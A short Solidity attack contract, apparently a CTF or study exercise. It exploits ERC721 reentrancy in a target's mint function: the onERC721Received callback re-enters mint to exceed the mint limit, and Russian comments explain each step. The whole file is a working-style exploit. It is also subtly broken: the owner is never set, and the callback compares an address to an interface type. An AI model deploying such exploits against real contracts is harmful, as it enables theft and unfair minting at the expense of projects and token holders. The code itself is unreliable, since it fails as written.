pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ITarget {
	function mint(uint amount) external;
}

contract Exploit is IERC721Receiver {
	ITarget private target;
  	uint private maxMints;
  	bool private complete;
	address private owner;
  constructor(address _target, uint _maxMints) {
    target = ITarget(_target);
    maxMints = _maxMints;
  }

  function exploit() external {
	require(owner == msg.sender);
    	target.mint(maxMints); // тригерим реетранси erc721
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) { // переопределяем каллбек, где реализована основная логика атаки erc721 reentrancy
	require(msg.sender == target);
    	if (!complete) {
      		complete = true;
      		target.mint(maxMints - 1); // перебираем все токены, отчеканивая их раз за разом
    	}
    	return this.onERC721Received.selector;
  }
}
